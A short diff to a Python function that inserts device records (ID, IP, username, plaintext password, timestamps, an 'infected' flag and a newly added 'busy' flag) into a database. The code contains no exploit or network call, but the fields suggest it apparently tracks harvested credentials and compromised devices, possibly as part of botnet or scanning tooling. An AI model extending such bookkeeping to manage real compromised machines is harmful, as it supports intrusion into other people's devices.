@@ -71,14 +71,14 @@ def db_insert(device_id, ip, username, password):
     con = get_con()
     now = datetime.datetime.now(datetime.UTC)
     con.execute("""
-        INSERT INTO devices (device_id, ip, username, password, first_seen, last_seen, infected)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
+        INSERT INTO devices (device_id, ip, username, password, first_seen, last_seen, infected, busy)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(device_id) DO UPDATE SET
             ip        = excluded.ip,
             username  = excluded.username,
             password  = excluded.password,
             last_seen = excluded.last_seen
-    """, (device_id, ip, username, password, now, now, 0))
+    """, (device_id, ip, username, password, now, now, 0, 0))
     con.commit()
     con.close()
 
